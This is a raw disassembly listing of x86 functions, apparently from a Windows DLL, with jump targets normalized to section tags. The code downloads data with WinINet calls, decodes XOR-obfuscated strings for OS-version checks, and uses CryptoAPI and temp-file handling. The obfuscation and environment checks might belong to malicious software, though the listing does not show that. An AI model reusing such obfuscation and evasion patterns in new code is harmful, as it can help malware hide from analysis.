sub_10061670
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x0
push 0x0
lea edx [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ecx ]
push edx
push eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call [ InternetQueryDataAvailable@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov edi [ ecx ]
push 0x401
push 0x0
mov [ ebp + 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
lea edx [ ebp + 0x8 ]
push edx
mov esi eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0x400
push esi
push ecx
call [ InternetReadFile@IAT ]
mov edx [ ebp + 0x8 ]
mov [ esi + edx ] 0x0
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
inc eax
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebx ]
lea ecx [ eax + edi + 0x1 ]
push ecx
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
inc ecx
push ecx
mov edx eax
add edx edi
push 0x0
push edx
mov [ ebx ] eax
call sub_1007f940
mov eax [ ebp + 0x8 ]
mov ecx [ ebx ]
push eax
add ecx edi
push esi
push ecx
call sub_1007f5d0
add esp 0x18
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
add [ eax ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push edx
call [ InternetQueryDataAvailable@IAT ]
test eax eax
jne r-xdata
sub_100617a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100868f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
cmp esi edi
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10028790
mov esi [ esi ]
test esi esi
je r-xdata
lea esp [ esp ]
push 0x40
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ edi ] ebx
xor eax eax
mov ecx [ esi ]
push ecx
mov ecx eax
call sub_1002e340
jmp r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
cmp [ edi ] 0x0
mov ebx eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] eax
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10061850
push ebp
mov ebp esp
sub esp 0x1bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ rw-data ]
push 0x11c
lea eax [ ebp - 0x1b8 ]
push 0x0
push eax
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x1b8 ]
push ecx
mov [ ebp - 0x1b8 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1b4 ] 0x5
push esi
mov esi [ StrStrIW@IAT ]
push edi
jne r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xc ]
mov eax 0x15
call sub_10049e00
lea edx [ ebp - 0x54 ]
mov eax 0x3
call sub_10049e00
lea edx [ ebp - 0x9c ]
mov eax 0x13
call sub_10049e00
lea edx [ ebp - 0x34 ]
mov eax 0xf
call sub_10049e00
lea edx [ ebp - 0xc ]
push edx
lea edi [ ebx + 0xda0 ]
push edi
call esi
test eax eax
jne r-xdata
cmp [ ebp - 0x1b0 ] 0x1
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x9c ]
push eax
push edi
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xc
call sub_10049e00
push edx
lea edi [ ebx + 0xda0 ]
push edi
call esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x34 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0xb
call sub_10049e00
mov eax edx
push eax
push edi
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x54 ]
push edx
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x11
call sub_10049e00
mov ecx edx
push ecx
push edi
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x19
call sub_10049e00
lea edx [ ebp - 0x64 ]
mov eax 0x4
call sub_10049e00
lea eax [ ebp - 0x78 ]
push eax
push edi
call esi
test eax eax
je r-xdata
call sub_1004ee30
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x64 ]
push ecx
push edi
call esi
test eax eax
je r-xdata
push 0x0
push 0x1
push r--data
push 0x0
lea edx [ ebp - 0x1bc ]
push edx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1bc ]
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
sub_10061a30
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x6c
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x80 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x80 ]
call sub_10045bd0
mov esi eax
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi edi
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0xda
mov esi 0x1
call sub_10053240
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x7c ]
push edx
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x7c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0xda
call sub_10053240
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov esi [ ebx + 0x130 ]
cmp esi edi
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ebx [ ebx ]
mov edi [ esi ]
lea ecx [ ebp - 0x7c ]
push ecx
call sub_1005f890
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10061b80
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_100362a0
mov [ esi + 0x4 ] 0x1
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f5d0
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10061c30
push ebp
mov ebp esp
push 0xffffffff
push sub_10089580
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ rw-data ]
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
mov ebx ecx
sar eax 0x2
mov [ ebp - 0x70 ] ebx
cmp eax 0x1
jbe r-xdata
xor eax eax
mov edi [ esi + 0x4 ]
cmp edi [ esi + 0x8 ]
je r-xdata
lea esp [ esp ]
push ebx
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov eax [ esi + 0x8 ]
lea ecx [ edi + 0x4 ]
sub eax ecx
sar eax 0x2
lea edx [ eax * 4 ]
push edx
push ecx
push edi
call sub_1007ec90
add [ esi + 0x8 ] 0xfffffffc
mov ecx [ r--data ]
add esp 0xc
xor edi edi
xor eax eax
lea ebx [ ebx ]
add edi 0x4
cmp edi [ esi + 0x8 ]
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff86
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x10
jb r-xdata
mov esi [ ebp - 0x70 ]
xor eax eax
mov [ ebp - 0x14 ] ax
mov ebx 0x7
xor ecx ecx
mov eax esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x50 ] cx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov eax [ edi ]
add eax 0x20
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x50 ]
call sub_1005ddc0
lea edx [ ebp - 0x50 ]
push edx
lea edx [ ebp - 0x34 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0x4
mov edx eax
mov ecx 0xc9
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x58 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] cx
cmp [ ebp - 0x3c ] esi
jb r-xdata
mov eax [ ebp - 0x6c ]
push eax
call sub_100187af
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x50 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10061dab
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10034c90
push [ esi + 0x10 ]
call sub_10034c90
push [ esi + 0x14 ]
call sub_10034c90
push [ esi + 0x18 ]
call sub_10034c90
add esp 0x10
pop esi
retn
sub_10061de0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x1c ] eax
call sub_1007f5d0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x1c ] 0x0
sub_10061e1c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1003f57a
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_1000a76c
test eax eax
movsx eax [ esi ]
push eax
call sub_1003f57a
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10061e96
push 0xc
mov eax sub_10085a34
call sub_100624bc
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
mov edi [ ebp + 0xc ]
and edi 0x8
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1005f7e4
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x20
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1003dd58
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000aa4a
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10046a34
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_1001699d
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_1003525f
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x8
call sub_1001f84c
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100554b0
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_10071f2c
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
jmp r-xdata
push 0x18
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_1001d737
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
push ebx
push ebx
call sub_1002c612
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_1005bf08
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_10045f32
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10030f91
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x10
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1006f8c4
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x1c
call sub_1001f84c
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1b
cmp ecx ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x11
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_1001ceed
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
call sub_10013ab8
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_100313b6
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x14
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
call sub_10006ada
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1004166b
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1002cc5a
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_10040209
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x17
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_1001ceed
mov [ esi ] r--data
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
sub_10062480
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_1005fbb8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_100624bc
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100624f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10088106
mov eax [ fs : 0x0 ]
push eax
sub esp 0x268
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x260 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x278 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
push 0x208
mov [ esp + 0x1c ] eax
mov ebx ecx
mov ecx [ ebp + 0x18 ]
lea eax [ esp + 0x68 ]
push 0x0
push eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x34 ] edx
call sub_1007f940
add esp 0xc
cmp [ ebx + 0x2e4 ] 0x0
mov [ esp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax 0x64
jmp r-xdata
push esi
mov ecx edi
lea esi [ esp + 0x4c ]
call sub_100704c0
add esp 0x4
mov esi eax
lea eax [ ebx + 0x2c4 ]
lea edi [ esp + 0x2c ]
mov [ esp + 0x280 ] 0x0
call sub_10019210
mov esi 0x8
mov [ esp + 0x280 ] 0x2
cmp [ esp + 0x5c ] esi
jb r-xdata
mov ecx [ esp + 0x18 ]
mov [ ecx ] 0xc8
mov eax 0x6
jmp r-xdata
mov ecx [ esp + 0x278 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x260 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x28 ]
xor eax eax
mov [ ecx ] eax
mov [ edx ] eax
mov [ esp + 0x48 ] ax
mov [ edi ] eax
lea eax [ esp + 0x64 ]
push eax
push 0x0
push r--data
lea ecx [ ebx + 0xb8 ]
push ecx
mov [ esp + 0x6c ] 0x7
mov [ esp + 0x68 ] 0x0
call [ GetTempFileNameW@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x2c ]
mov [ esp + 0x20 ] r--data
mov [ esp + 0x24 ] 0x0
cmp [ esp + 0x40 ] esi
jae r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
mov edx [ ebx + 0x2e0 ]
push 0x0
lea ecx [ esp + 0x6c ]
push ecx
push eax
push 0x0
call edx
test eax eax
jns r-xdata
lea eax [ esp + 0x2c ]
cmp [ esp + 0x64 ] 0x0
je r-xdata
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
lea ecx [ esp + 0x64 ]
push ecx
call [ DeleteFileW@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
lea eax [ esp + 0x7c ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov esi [ Sleep@IAT ]
cmp [ esp + 0x40 ] 0x8
jb r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esi ]
test eax eax
je r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ edi ] eax
cmp eax 0xffffffff
je r-xdata
mov [ esp + 0x10 ] 0x3
jmp r-xdata
push 0x3e8
call esi
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax ebx
mov edx [ esp + 0x2c ]
push edx
call sub_100187af
add esp 0x4
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi ] 0x0
mov [ edi ] 0x0
mov [ esp + 0x10 ] 0x4
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esp + 0x14 ]
push 0x0
lea edx [ esp + 0x20 ]
push edx
mov [ ecx ] eax
mov ecx [ edi ]
push ecx
push eax
push esi
mov [ esp + 0x30 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x5
jmp r-xdata
mov edx [ edi ]
cmp edx [ esp + 0x1c ]
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x18 ]
mov [ eax ] 0xc8
jmp r-xdata
sub_100627b5
mov edi edi
push ebp
mov ebp esp
push esi
xor eax eax
push 0xffffffff
mov esi ecx
and [ esi + 0x10 ] 0x0
push eax
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1007084d
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100627e0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x71c71c7
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
